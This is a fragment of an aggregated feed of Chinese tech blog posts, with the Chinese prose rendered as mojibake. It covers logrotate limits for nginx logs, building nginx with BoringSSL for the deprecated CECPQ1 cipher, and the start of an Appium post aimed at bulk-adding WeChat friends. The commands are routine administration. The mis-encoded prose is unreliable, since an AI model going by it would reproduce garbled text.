    daily  # æ»šåŠ¨é¢‘ç‡ï¼Œæ¯å¤©æ»šåŠ¨ä¸€æ¬¡ã€‚å…¶å®ƒå¯é€‰é¡¹ä¸º hourly weekly monthly yearly
    missingok
    rotate 14  # æœ€å¤šä¿ç•™14æ¬¡æ»šåŠ¨ï¼Œè¶…è¿‡åˆ™åˆ é™¤æœ€è€çš„æ—¥å¿—
    maxsize 100M  # é‡è¦ï¼æ´»åŠ¨æ—¥å¿—çš„æœ€å¤§å°ºå¯¸ï¼Œè¶…è¿‡è¯¥å°ºå¯¸åˆ™å¼ºåˆ¶æ»šåŠ¨ä¸€æ¬¡
    compress  # é‡è¦ï¼å‹ç¼©ä¸æ´»åŠ¨çš„æ—¥å¿—ï¼Œé»˜è®¤ä½¿ç”¨gzip
    delaycompress
    notifempty  # å¦‚æœæ—¥å¿—ä¸ºç©ºåˆ™ä¸æ»šåŠ¨
    create 0640 www-data adm
    sharedscripts
    prerotate  # åœ¨æ¯æ¬¡æ»šåŠ¨å‰æ‰§è¡Œçš„è„šæœ¬ï¼Œé€šå¸¸æ˜¯é€šçŸ¥è¯¥æœåŠ¡â€œæˆ‘è¦æ»šåŠ¨æ—¥å¿—å•¦ï¼å…ˆåˆ«ç”Ÿæˆæ–°æ—¥å¿—å’¯ï¼â€
        if [ -d /etc/logrotate.d/httpd-prerotate ]; then \
        run-parts /etc/logrotate.d/httpd-prerotate; \
        fi \
    endscript
    postrotate  # åœ¨æ»šåŠ¨å®Œæˆåæ‰§è¡Œçš„è„šæœ¬ï¼Œé€šå¸¸æ˜¯é€šçŸ¥è¯¥æœåŠ¡â€œæ—¥å¿—æ»šåŠ¨å®Œæˆå•¦ï¼è¯·æŠŠåç»­æ—¥å¿—å†™åˆ°æ–°çš„æ´»åŠ¨æ—¥å¿—æ–‡ä»¶ä¸­å»ï¼â€
        invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1
    endscript
}

</pre>
<p>å¦‚æœå‘ç°æ—¥å¿—æ»šåŠ¨å nginx ä¾æ—§åœ¨å‘ access.log.1 ä¸­å†™å…¥æ—¥å¿—ï¼Œè€Œæ–°åˆ›å»ºçš„ access.log å¤§å°å§‹ç»ˆæ˜¯0ï¼Œé‚£ä¹ˆè¯·å°†ä¸Šæ–‡ä¸­çš„ postrotate ä»£ç æ”¹ä¸ºï¼š</p>
<pre class="brush: bash; title: ; notranslate">

service nginx rotate &gt;/dev/null 2&gt;&amp;1

</pre>
<h1>åˆ’é‡ç‚¹</h1>
<p>åŒå­¦Aï¼šæ…¢ç€ï¼åˆšåˆšä¸æ˜¯è¯´ä½ æœåŠ¡å™¨è·‘çš„ Ubuntu Server é»˜è®¤å¯ç”¨äº† logrotate ä¹ˆï¼Ÿé‚£ä¹ˆä¸ºä»€ä¹ˆä½ çš„ç¡¬ç›˜è¿˜æ˜¯è¢«è¿™äº›æ—¥å¿—æ–‡ä»¶åƒäº†ä¸ªç²¾å…‰å‘¢ï¼ŸæŒ‰è¯´ä¸€å…±å°±ä¿ç•™14ä»½æ—¥å¿—ï¼Œä¹Ÿå°±åªæœ‰14å¤©çš„ä»½ï¼Œè¿˜éƒ½æ˜¯å‹ç¼©è¿‡çš„ï¼Œæ€ä¹ˆä¼šå ç”¨è¿™ä¹ˆå¤šå‘¢ï¼Ÿ</p>
<p>æˆ‘ï¼š<del>è°¢å°”æ›¼M1ï¼Œåï¼</del></p>
<p>é—®é¢˜æ¥äº†ï¼Œè¿™ä¸ª logrotate çš„é»˜è®¤é…ç½®æ–‡ä»¶ï¼Œå°‘äº†Â <em>maxsize 100M</em> è¿™ä¸€è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœè¯´åœ¨ç¬¬äºŒå¤©çš„æ»šåŠ¨å¼€å§‹å‰ï¼Œæ—¥å¿—å°±å·²ç»å ç”¨äº†è¿‡å¤§çš„ç©ºé—´ï¼Œä»¥è‡³äºå‰©ä½™ç©ºé—´ä¸è¶³ä»¥å‚¨å­˜å¯¹åº”æ—¥å¿—çš„å‹ç¼©æ–‡ä»¶ï¼ˆå› ä¸ºå¾—å…ˆå‹ç¼©å®Œæ‰èƒ½åˆ é™¤åŸå§‹æ–‡ä»¶ï¼Œäºæ˜¯æ•´ä¸ªè¿‡ç¨‹æ‰€éœ€çš„æœ€å¤§ç©ºé—´æ˜¯ <em>åŸå§‹æ–‡ä»¶ä½“ç§¯+å‹ç¼©åçš„ä½“ç§¯</em>ï¼Œæ¯•ç«Ÿä¸å¯èƒ½ä¸€è¾¹å‹ç¼©ä¸€è¾¹åˆ é™¤åŸå§‹æ–‡ä»¶å˜›ï¼‰çš„è¯ï¼Œæ•´ä¸ªæ—¥å¿—æ»šåŠ¨å°±ä¼šå¤±è´¥ã€‚è€Œæˆ‘çš„å®é™…æƒ…å†µå°±æ˜¯ access.log.0 æ–‡ä»¶å ç”¨äº†13Gçš„ç©ºé—´ï¼ˆå‰©ä¸‹çš„13ä¸ªå‹ç¼©åçš„æ—¥å¿—ä¸€å…±æ‰1Gä¸åˆ°ï¼Œå®Œç¾çš„ä½“ç°äº†å‹ç¼©çš„å¥½å¤„ï¼‰ï¼Œå‰©ä½™çš„ç©ºé—´ä¸è¶³ä»¥å¯¹å…¶è¿›è¡Œå‹ç¼©ï¼Œäºæ˜¯æ•´ä¸ªæ—¥å¿—æ»šåŠ¨å½»åº•å¤±æ•ˆäº†ã€‚</p>
<p>å½“ç„¶äº†ï¼Œç†æƒ³çš„æƒ…å†µä¸‹ï¼Œå¦‚æœèƒ½å¤Ÿå°†å…¶è®¾ç½®æˆå…¨éƒ¨æ—¥å¿—åŠ èµ·æ¥çš„ä½“ç§¯è¶…è¿‡ä¸€ä¸ªä¸´ç•Œç‚¹ï¼ˆæ¯”å¦‚æ—¥å¿—ä¸€å…±5Gï¼‰é‚£ä¹ˆå°±è‡ªåŠ¨åˆ é™¤æœ€è€çš„ä¸€ä»½æ—¥å¿—ï¼Œé‚£æ˜¯å å¼å˜€ï¼ç„¶è€Œ logrotate å¹¶æ²¡æœ‰æä¾›è¿™æ ·çš„æ•´ä½“ä½“ç§¯é™åˆ¶çš„åŠŸèƒ½ï¼Œäºæ˜¯åªå¥½ç”¨ä¸€äº›å°æŠ€å·§ã€‚æ³¨æ„è¿™ä¸¤è¡Œï¼š</p>
<pre class="brush: bash; title: ; notranslate">
rotate 14 # æœ€å¤šä¿ç•™14æ¬¡æ»šåŠ¨ï¼Œè¶…è¿‡åˆ™åˆ é™¤æœ€è€çš„æ—¥å¿—
maxsize 100M # é‡è¦ï¼æ´»åŠ¨æ—¥å¿—çš„æœ€å¤§å°ºå¯¸ï¼Œè¶…è¿‡è¯¥å°ºå¯¸åˆ™å¼ºåˆ¶æ»šåŠ¨ä¸€æ¬¡
</pre>
<p>é€šè¿‡é™åˆ¶æ´»åŠ¨æ—¥å¿—çš„ä½“ç§¯ï¼ˆä¹Ÿå°±æ˜¯å°¾å·æ˜¯0æˆ–è€…æ²¡æœ‰åç¼€çš„é‚£ä¸ªæ—¥å¿—æ–‡ä»¶ï¼‰å’Œä¿ç•™æ—¥å¿—æ»šåŠ¨æ•°é‡ï¼Œæˆ‘ä»¬èƒ½å¤Ÿé™åˆ¶æ•´ä½“çš„æ—¥å¿—å¤§å°ï¼Œä¹Ÿå³ä¸è¶…è¿‡ 14 * 100M = 1.4Gã€‚å½“ç„¶è¿™æ ·çš„ç¼ºç‚¹å°±æ˜¯å¦‚æœæŸä¸€å¤©çš„æ—¥å¿—ç‰¹åˆ«å¤šï¼Œé‚£ä¹ˆé‚£ä¸€å¤©çš„æ—¥å¿—ä¼šè¢«æ‹†åˆ†æˆå¤šä¸ªï¼ˆè¯¾å¤–é¢˜ï¼šè‡ªè¡Œç™¾åº¦ï¼Œå°†æ—¥å¿—æ–‡ä»¶åç¼€è®¾ç½®ä¸ºå½“å‰çš„æ—¥æœŸæ—¶é—´ï¼‰ã€‚</p>
<h1>æ€»ç»“</h1>
<p>ä¸é™åˆ¶æ—¥å¿—ä½“ç§¯çœŸæ˜¯å‘å•Šï¼</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/logrotate.html">Logrotate æ—¥å¿—æ»šåŠ¨ è§£å†³æ—¥å¿—å ç”¨ç©ºé—´è¿‡å¤§</a>ï¼Œé¦–å‘äº<a rel="nofollow" href="https://www.noisyfox.io">ç‹ç‹¸çš„å°å°çª</a>ã€‚</p>]]></content>
        <author>
            <name><![CDATA[ç‹ç‹¸çš„å°å°çª]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/cecpq1-nginx-boringssl.html</id>
        <title><![CDATA[Use CECPQ1 On Your Website with Nginx & BoringSSL]]></title>
        <updated>2016-09-13T06:38:13+08:00</updated>
        <link href="https://www.noisyfox.io/cecpq1-nginx-boringssl.html"/>
        <content type="text/html" src="https://www.noisyfox.io/cecpq1-nginx-boringssl.html"><![CDATA[<h2>Deprecated / å·²å¼ƒç”¨</h2>
<p>In 2016, the experimental use in Chrome ended and it was planned to disable CECPQ1 in a later Chrome update.</p>
<p>CECPQ1çš„å®éªŒå·²ç»ç»“æŸï¼Œç›®å‰çš„chrome stableå·²ç»ç§»é™¤äº†å¯¹å…¶çš„æ”¯æŒã€‚</p>
<hr />
<h2>What is CECPQ1</h2>
<p>CECPQ1 æ˜¯è°·æ­Œæå‡ºçš„ä¸€ç§â€œ<a href="https://en.wikipedia.org/wiki/Post-quantum_cryptography" target="_blank" rel="noopener noreferrer">åé‡å­æ—¶ä»£</a>â€çš„å¯†é’¥äº¤æ¢ç®—æ³•ã€‚</p>
<p>æ‰€è°“çš„åé‡å­æ—¶ä»£ç®—æ³•ï¼Œå¤§æ„æ˜¯è¯´è¯¥ç®—æ³•éš¾ä»¥è¢«å°†æ¥å¯èƒ½å‡ºç°çš„é‡å­è®¡ç®—æœºè½»æ˜“ç ´è§£ã€‚<br />
è€Œç›®å‰å¸¸ç”¨çš„éå¯¹ç§°åŠ å¯†/å¯†é’¥äº¤æ¢ç®—æ³•çš„å®‰å…¨æ€§å¤§å¤šä¾èµ–äºå¤§æ•°åˆ†è§£ä»¥åŠé€†æ¨æ¤­åœ†æ›²çº¿çš„éš¾åº¦ã€‚è€Œè¿™äº›é—®é¢˜å¯èƒ½å¯¹äºé‡å­è®¡ç®—æœºæ¥è¯´å¯ä»¥è½»æ¾è§£å†³ã€‚æ•…è€Œéœ€è¦ä¸€ç§æ–°çš„åŠ å¯†åŸç†æ¥å¯¹æŠ—é‡å­è®¡ç®—æœºçš„å¨èƒã€‚</p>
<p>å½“ç„¶å°†æ¥èƒ½ä¸èƒ½åˆ¶é€ å‡ºå¤§å‹çš„é‡å­è®¡ç®—æœºå¹¶ç ´è§£ç°æœ‰çš„åŠ å¯†ç®—æ³•ä¾æ—§æ˜¯ä¸ªæœªçŸ¥æ•°ã€‚<a href="https://community.letsencrypt.org/t/google-is-experimenting-with-post-quantum-crypto-for-tls/17720" target="_blank" rel="noopener noreferrer">ä¸è¿‡è°·æ­Œåœ¨å‰æ®µæ—¶é—´å¼€å§‹å·²ç»åœ¨è‡ªå·±çš„ chrome ä»¥åŠæœåŠ¡å™¨ä¸Šå¯ç”¨äº†è¯¥å¯†é’¥äº¤æ¢ç®—æ³•</a>ï¼Œä½¿ç”¨ Chrome 54+ è®¿é—®è°·æ­Œçš„æœåŠ¡ï¼Œå¯ä»¥çœ‹åˆ°ç±»ä¼¼ä¸‹å›¾çš„ç»“æœï¼š<br />
<a href="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQæˆªå›¾20160913150853.png"><img class="aligncenter size-full wp-image-416" src="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQæˆªå›¾20160913150853.png" alt="CECPQ1 on Google" width="642" height="401" /></a></p>
<p>å…¶ä¸­çš„â€œCECPQ1_ECDSAâ€å³è¡¨æ˜äº†å…¶é‡‡ç”¨äº† CECPQ1 å¯†é’¥äº¤æ¢ + ECDSA ç­¾åç®—æ³•ã€‚</p>
<p>å½“ç„¶çº¯ç²¹æ˜¯å¥½ç©ï¼Œæˆ‘ä¹Ÿè£…ä¿®äº†ä¸€ä¸‹æˆ‘çš„å°çªï¼Œè®©å®ƒä¹Ÿæ”¯æŒäº†è¿™ç§å‰å®³çš„ç®—æ³•~<br />
<a href="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQæˆªå›¾20160913151547.png"><img class="aligncenter size-full wp-image-418" src="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQæˆªå›¾20160913151547.png" alt="CECPQ1 on Noisyfox" width="642" height="401" /></a></p>
<p>ä¸è¿‡ç”±äºæˆ‘çš„è¯ä¹¦æ˜¯ RSA ç­¾åçš„ï¼Œæ•…å›¾ä¸­é‡‡ç”¨çš„æ˜¯â€œCECPQ1_RSAâ€è€Œä¸æ˜¯ ECDSAã€‚</p>
<p>å¦‚æœä½ ä¹Ÿæƒ³è®©è‡ªå·±çš„ç½‘ç«™æ”¯æŒè¿™ç§ç®—æ³•ï¼Œé‚£ä¹ˆå°±è·Ÿç€ç‹ç‹¸æˆ‘ä¸€æ­¥ä¸€æ­¥æ¥é…ç½®ä½ çš„ç½‘ç«™å§~</p>
<hr />
<h2>æ•™ç¨‹ç¯å¢ƒ</h2>
<ul>
<li>Ubuntu 14.04.4 LTS</li>
<li>nginx-1.10.1</li>
<li>BoringSSL</li>
</ul>
<p>ç”±äºç›®å‰ä»…æœ‰ BoringSSL æ”¯æŒ CECPQ1 ç®—æ³•ï¼Œæ•…æˆ‘ä»¬éœ€è¦è‡ªè¡Œé‡‡ç”¨ BoringSSL æ¥ç¼–è¯‘ nginxã€‚</p>
<p>å¯¹äº Debian ç”¨æˆ·ï¼Œä»¥åŠ Ubuntu 14.04 ä¹‹å‰çš„ç”¨æˆ·ï¼Œå¯ä»¥é‡‡ç”¨<a href="https://github.com/ajhaydock/BoringNginx" target="_blank" rel="noopener noreferrer">BoringNginx</a>é¡¹ç›®æ¥ä¸€é”®ç¼–è¯‘ã€å®‰è£…ã€‚</p>
<p>å¯¹äº Ubuntu 14.04 åŠä»¥åçš„ç”¨æˆ·ï¼Œç”±äº Ubuntu é‡‡ç”¨äº† Systemd æ›¿æ¢äº† upstartï¼Œæ•… BoringNginx è„šæœ¬ä¼šå‡ºé—®é¢˜ã€‚åŒæ—¶ BoringNginx è¦æ±‚è„šæœ¬å¿…é¡»åœ¨é root ç”¨æˆ·ä¸‹æ‰§è¡Œï¼Œè¿™å¯¹äºå¤§éƒ¨åˆ†ä¹ æƒ¯ç”¨ root ç”¨æˆ·æ¥é…ç½®æœåŠ¡å™¨çš„ç”¨æˆ·æ¥è¯´ååˆ†ä¸ä¾¿ï¼Œæ•…éœ€é‡‡ç”¨æ‰‹åŠ¨ç¼–è¯‘ã€å®‰è£…ã€‚</p>
<hr />
<h2>ç¼–è¯‘ BoringSSL &amp; Nginx</h2>
<p><em>æ³¨ï¼šè¯¥éƒ¨åˆ†æ•™ç¨‹å‚è€ƒäº†Â Jerry Qu ã€Š<a href="https://imququ.com/post/optimize-ssl-ciphers-with-boringssl.html" target="_blank" rel="noopener noreferrer">ä½¿ç”¨ BoringSSL ä¼˜åŒ– HTTPS åŠ å¯†ç®—æ³•é€‰æ‹©</a>ã€‹ä¸€æ–‡ï¼Œåœ¨æ­¤è¡¨ç¤ºæ„Ÿè°¢ã€‚</em></p>
<p>é¦–å…ˆå»ºç«‹ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸‹è½½ Nginx å’Œ BoringSSL æºç ã€‚</p>
<p>Nginx ä» 1.7.4 å¼€å§‹æ”¯æŒ BoringSSLï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯æœ€æ–°çš„ç¨³å®šç‰ˆ Nginxï¼š</p>
<pre class="brush: bash; title: ; notranslate">
mkdir nginx &amp;&amp; cd nginx
wget http://nginx.org/download/nginx-1.10.1.tar.gz
tar xzf nginx-1.10.1.tar.gz

git clone https://boringssl.googlesource.com/boringssl
</pre>
<p>ç°åœ¨ä½ çš„ nginx æ–‡ä»¶å¤¹é‡Œåº”è¯¥ä¼šæœ‰è¿™ä¸¤ä¸ªå­ç›®å½•ï¼š</p>
<pre class="brush: bash; title: ; notranslate">
boringssl/
nginx-1.10.1/
</pre>
<p>æ¥ä¸‹æ¥è¿˜éœ€è¦åšä¸€äº›å‡†å¤‡å·¥ä½œï¼š</p>
<pre class="brush: bash; title: ; notranslate">
# å®‰è£…ç¼–è¯‘ BoringSSL æ‰€éœ€çš„ Golang å’Œ cmake
sudo apt-get install golang cmake

# å®‰è£…ç¼–è¯‘ Nginx æ‰€éœ€çš„å·¥å…·å’Œä¾èµ–åº“
sudo apt-get install build-essential libpcre3 libpcre3-dev zlib1g-dev

# å¿½ç•¥ç¼–è¯‘è¿‡ç¨‹ä¸­çš„ Warningï¼ˆä¸åŠ è¿™ä¸ªï¼Œç¼–åˆ°ä¸€åŠä¼šå› ä¸º Warning å¤ªå¤šæ— æ³•ç»§ç»­ï¼‰
export CFLAGS=&quot;-Wno-error&quot;
</pre>
<p>éšåç¼–è¯‘ BoringSSLï¼š</p>
<pre class="brush: bash; title: ; notranslate">
# è¿›å…¥ BoringSSL æºç æ ¹ç›®å½•
cd boringssl

# åˆ›å»º build ç›®å½•å¹¶ç¼–è¯‘ï¼Œå®Œæˆåå›åˆ° BoringSSL æºç æ ¹ç›®å½•
mkdir build &amp;&amp; cd build &amp;&amp; cmake ../ &amp;&amp; make &amp;&amp; cd ../

# åˆ›å»º .openssl ç›®å½•ï¼Œå¹¶å°†åº“æ–‡ä»¶å’Œç¼–è¯‘åçš„æ–‡ä»¶æ”¾è¿›å»
mkdir -p .openssl/lib &amp;&amp; cd .openssl &amp;&amp; ln -s ../include . &amp;&amp; cd ../
cp build/crypto/libcrypto.a build/ssl/libssl.a .openssl/lib

cd ../
</pre>
<p>ç„¶åå°±å¯ä»¥ç”¨ BoringSSL æ¥ç¼–è¯‘ Nginx äº†ï¼š</p>
<pre class="brush: bash; title: ; notranslate">
# è¿›å…¥ Nginx æºç æ ¹ç›®å½•
cd nginx-1.10.1

# æŒ‡å®šä½¿ç”¨ BoringSSL ä½œä¸º SSL åº“
# è¿™é‡Œçš„å‚æ•°æ¯”åŸæ–‡è¦å¤šäº†è®¸å¤šï¼Œæ˜¯ä¸ºäº†å…¼å®¹é‡‡ç”¨ apt å®‰è£…çš„ Nginx çš„é…ç½®
./configure --with-openssl=../boringssl \
--prefix=/usr/share/nginx \
--sbin-path=/usr/sbin/nginx \
--conf-path=/etc/nginx/nginx.conf \
--error-log-path=/var/log/nginx/error.log \
--http-log-path=/var/log/nginx/access.log \
--pid-path=/run/nginx.pid \
--lock-path=/run/lock/subsys/nginx \
--user=www-data \
--group=www-data \
--with-threads \
--with-file-aio \
--with-ipv6 \
--with-http_ssl_module \
--with-http_v2_module \
--with-http_realip_module \
--with-http_gunzip_module \
--with-http_gzip_static_module \
--with-http_slice_module \
--with-http_stub_status_module \
--without-select_module \
--without-poll_module \
--without-mail_pop3_module \
--without-mail_imap_module \
--without-mail_smtp_module

# ä¿®æ”¹æ—¶é—´ï¼Œé¿å… Nginx å†æ¬¡ç¼–è¯‘ BoringSSL
touch ../boringssl/.openssl/include/openssl/ssl.h
</pre>
<p>ç„¶åå°±å¯ä»¥å¼€å§‹ç¼–è¯‘ Nginx äº†ï¼Œ ç›´æ¥æ‰§è¡Œï¼š</p>
<pre class="brush: bash; title: ; notranslate">
make
</pre>
<p>ä¸€åˆ‡æ­£å¸¸çš„è¯ï¼Œå³å¯åœ¨ objs ç›®å½•é‡Œæ‰¾åˆ°ç¼–è¯‘å¥½çš„ Nginxã€‚<br />
æ‰§è¡Œï¼š</p>
<pre class="brush: bash; title: ; notranslate">
cd objs
./nginx -V
</pre>
<p>åº”è¯¥å¯ä»¥çœ‹åˆ°ç±»ä¼¼è¿™æ ·çš„è¾“å‡ºï¼š</p>
<pre class="brush: bash; title: ; notranslate">
nginx version: nginx/1.10.1
built with OpenSSL 1.0.2 (compatible; BoringSSL) (running with BoringSSL)
TLS SNI support enabled
configure arguments: --with-openssl=../boringssl --prefix=/usr/share/nginx --sbin-path=/usr/sbin/nginx --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/run/nginx.pid --lock-path=/run/lock/subsys/nginx --user=www-data --group=www-data --with-threads --with-file-aio --with-ipv6 --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_slice_module --with-http_stub_status_module --without-select_module --without-poll_module --without-mail_pop3_module --without-mail_imap_module --without-mail_smtp_module
</pre>
<p>è¡¨æ˜ç¼–è¯‘æˆåŠŸäº†ã€‚ä¸‹é¢æˆ‘ä»¬è¦å°†è¯¥ Nginx å®‰è£…è‡³ç³»ç»Ÿä¸­ã€‚</p>
<hr />
<h2>å®‰è£… Nginx with BoringSSL</h2>
<p>ç”±äºé…ç½®æœåŠ¡éœ€è¦ä¸€äº›é¢å¤–çš„çŸ¥è¯†ï¼Œå› æ­¤ä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘é‡‡ç”¨äº† <em>ä½¿ç”¨ apt å®‰è£…åŸç‰ˆ Nginx ç„¶åæ›¿æ¢å¯æ‰§è¡Œæ–‡ä»¶</em> çš„æ–¹å¼æ¥ç®€åŒ–å®‰è£…å’ŒæœåŠ¡çš„é…ç½®ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåœ¨ä¸Šæ–‡ä¸­æˆ‘å»ºè®®ä½¿ç”¨å’Œ apt å®‰è£…çš„ Nginx ç›¸ä»¿çš„é…ç½®æ¥ç¼–è¯‘è‡ªå·±çš„ Nginxã€‚</p>
<p>é¦–å…ˆç”¨ apt æ¥å®‰è£…åŸç‰ˆ Nginxï¼š</p>
<pre class="brush: bash; title: ; notranslate">
# ä» Ubuntu 16.04 å¼€å§‹ç³»ç»Ÿè‡ªå¸¦æºçš„ nginx å°±æ˜¯1.10 ç‰ˆæœ¬çš„
apt-get install nginx
</pre>
<p>æˆ–è€…</p>
<pre class="brush: bash; title: ; notranslate">
# å…ˆæ·»åŠ  Nginx å®˜æ–¹è½¯ä»¶æº
add-apt-repository ppa:nginx/stable
apt-get update
apt-get install nginx
</pre>
<p>ç„¶åæ›¿æ¢åŸç‰ˆ Nginx ä¸ºæˆ‘ä»¬è‡ªå·±ç¼–è¯‘çš„ç‰ˆæœ¬ï¼š</p>
<pre class="brush: bash; title: ; notranslate">
# å…ˆåœæ­¢ Nginx æœåŠ¡
service nginx stop

# å¤‡ä»½åŸç‰ˆå¯æ‰§è¡Œæ–‡ä»¶
cp /usr/sbin/nginx  ./nginx.bak

# æ›¿æ¢ Nginx å¯æ‰§è¡Œæ–‡ä»¶
cp nginx /usr/sbin/nginx

# åˆ é™¤ Nginx é»˜è®¤çš„ modulesï¼Œ å¦åˆ™å¯èƒ½å¯åŠ¨æ—¶æŠ¥äºŒè¿›åˆ¶ä¸å…¼å®¹çš„é”™è¯¯
rm /etc/nginx/modules-enabled/*
</pre>
<p>è¿™æ ·ä¸€æ¥ï¼Œå°±æˆåŠŸçš„å°†ç³»ç»Ÿä¸­çš„ Nginx æ›¿æ¢ä¸ºæˆ‘ä»¬è‡ªå·±ç¼–è¯‘çš„ç‰ˆæœ¬ï¼ŒåŒæ—¶åˆä¿ç•™äº†åŸç‰ˆçš„æœåŠ¡æ§åˆ¶æ–¹å¼ï¼Œéå¸¸æ–¹ä¾¿ã€‚</p>
<hr />
<h2>é…ç½® Cipher Suite</h2>
<p>åœ¨è¿™é‡Œå‡å®šä½ å·²ç»çŸ¥é“å¦‚ä½•é…ç½®Â Nginx + SSL äº†ï¼Œå¦‚æœä¸ä¼šï¼Œè¯·ç™¾åº¦æˆ–è€…è°·æ­Œä¸€ä¸‹ã€‚</p>
<p>ä¸ºäº†å¯ç”¨ CECPQ1 ç®—æ³•ï¼Œéœ€è¦é…ç½®æ­£ç¡®çš„ Cipher Suitï¼š</p>
<pre class="brush: plain; title: ; notranslate">
ssl_ciphers &quot;[CECPQ1-ECDSA-AES256-GCM-SHA384|CECPQ1-ECDSA-CHACHA20-POLY1305-SHA256]:[CECPQ1-RSA-AES256-GCM-SHA384|CECPQ1-RSA-CHACHA20-POLY1305-SHA256]:[ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305-SHA256]:[ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305-SHA256]:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:RSA-AES128-GCM-SHA256:RSA-AES256-GCM-SHA384:RSA-AES128-SHA:RSA-AES256-SHA:RSA-3DES-EDE-SHA&quot;;
ssl_prefer_server_ciphers on;
</pre>
<p>å…¶ä¸­æœ€å…ˆå‡ºç°çš„å‡ ä¸ªä»¥â€œCECPQ1â€å¼€å¤´çš„ç®—æ³•å°±æ˜¯æœ¬æ–‡æåˆ°çš„ç®—æ³•ã€‚<br />
å…³äºè¯¥ Cipher Suite çš„æ ¼å¼å’Œæ„æ€ï¼Œä¹Ÿè¯·å‚è€ƒã€Š<a href="https://imququ.com/post/optimize-ssl-ciphers-with-boringssl.html" target="_blank" rel="noopener noreferrer">ä½¿ç”¨ BoringSSL ä¼˜åŒ– HTTPS åŠ å¯†ç®—æ³•é€‰æ‹©</a>ã€‹ä¸€æ–‡ã€‚</p>
<p>åŒæ—¶æˆ‘ä»¬ç¼–è¯‘å‡ºçš„ Nginx æ˜¯æ”¯æŒ HTTP/2 ä»¥åŠ ALPN çš„ï¼Œåœ¨ä½ çš„é…ç½®é‡Œå†™ä¸Šï¼š</p>
<pre class="brush: plain; title: ; notranslate">
listen 443 ssl http2;
</pre>
<p>å³å¯å¯ç”¨æœ€æ–°æœ€ç‚«é…·çš„ h2 å•¦ï¼<br />
ï¼ˆå½“ç„¶è°·æ­Œåˆå¼„äº†ä¸ª QUIC åè®®ï¼Œç›®å‰ä¸å¤ªå®¹æ˜“åœ¨ Nginx ä¸Šå®ç°ï¼Œæ®‹å¿µã€‚ï¼‰</p>
<hr />
<h2>Â ç»“æŸ</h2>
<p>è¿™ç¯‡æ•™ç¨‹åˆ°è¿™é‡Œå°±ç»“æŸå•¦~å¦‚æœå„ä½è¯»è€…è€çˆ·å‘ç°æœ‰ä»€ä¹ˆé”™è¯¯æˆ–ä¸å½“ä¹‹å¤„ï¼Œè¿˜è¯·å›å¤æŒ‡æ­£~</p>
<p>ä¹Ÿæ¬¢è¿å„ä½å…±åŒæ¢è®¨ç›¸å…³æŠ€æœ¯~</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/cecpq1-nginx-boringssl.html">Use CECPQ1 On Your Website with Nginx &#038; BoringSSL</a>ï¼Œé¦–å‘äº<a rel="nofollow" href="https://www.noisyfox.io">ç‹ç‹¸çš„å°å°çª</a>ã€‚</p>]]></content>
        <author>
            <name><![CDATA[ç‹ç‹¸çš„å°å°çª]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2016/08/appium-android-ui-test/</id>
        <title><![CDATA[Appiumåœ¨Android UIæµ‹è¯•ä¸­çš„åº”ç”¨]]></title>
        <updated>2016-08-18T15:29:08+08:00</updated>
        <link href="https://www.summershrimp.com/2016/08/appium-android-ui-test/"/>
        <content type="text/html" src="https://www.summershrimp.com/2016/08/appium-android-ui-test/"><![CDATA[<h2>Androidæµ‹è¯•å·¥å…·ä¸Appiumç®€ä»‹</h2>
<p>Appiumæ˜¯ä¸€ä¸ªC/Sæ¶æ„çš„ï¼Œæ”¯æŒAndroid/iOS Native, Hybrid å’Œ Mobile Web Appsçš„æµ‹è¯•æ¡†æ¶ï¼Œä¸æµ‹è¯•ç¨‹åºé€šè¿‡Selenum Webdriveråè®®é€šè®¯ã€‚Webdriverçš„å¥½å¤„æ˜¯é€šè¿‡HTTP RPCçš„æ–¹å¼è°ƒç”¨Serverä¸Šçš„è¿‡ç¨‹ï¼Œç¼–å†™æµ‹è¯•è„šæœ¬ä¸å—è¯­è¨€çš„é™åˆ¶ï¼Œæ— è®ºæ˜¯Python, Java, NodeJSå‡å¯ä»¥æ–¹ä¾¿çš„ç¼–å†™æµ‹è¯•ã€‚æœ¬æ–‡ä¸­å°†ä½¿ç”¨Pythonè¿›è¡Œç¼–ç¨‹ã€‚</p>
<p>èµ·å› æ˜¯å› ä¸ºå¸‚åœºéƒ¨çš„åŒäº‹æŠ›æ¥å¦‚ä¸‹éœ€æ±‚ï¼šæ‰¹é‡æ·»åŠ ä¸€äº›å¾®ä¿¡å¥½å‹ã€‚ç›´æ¥æŠ“å–è¯·æ±‚è¿›è¡Œé‡æ”¾çš„æ–¹æ³•æ˜¯ä¸é è°±çš„ï¼Œå¾®ä¿¡ä¸æœåŠ¡ç«¯çš„é€šè®¯å‡åŠ å¯†ï¼ŒPassã€‚è€ƒè™‘ä½¿ç”¨xposedç­‰æ¡†æ¶hookç›¸å…³å‡½æ•°è¿›è¡Œæ“ä½œã€‚ä½†æ˜¯xposedéœ€è¦è¶Šç‹±ï¼Œä¸”å¼€å‘å¤æ‚ï¼ŒPassã€‚åæ¥æƒ³åˆ°äº†ä½¿ç”¨UIæµ‹è¯•å·¥å…·è¿›è¡Œæ¨¡æ‹Ÿæ“ä½œï¼Œå¼€å‘è¾ƒä¸ºç®€å•ã€‚</p>
